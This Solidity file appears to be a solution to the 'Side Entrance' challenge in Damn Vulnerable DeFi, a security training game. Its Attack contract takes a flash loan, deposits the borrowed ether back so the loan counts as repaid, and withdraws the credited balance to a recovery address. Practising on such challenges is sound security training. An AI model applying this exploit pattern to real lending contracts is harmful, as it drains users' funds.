// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract Attack {
    SideEntranceLenderPool pool;
    error RepayFailed();

    receive() external payable {
       
    }

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function loan(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw(address recovery) external payable {
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
    }
}
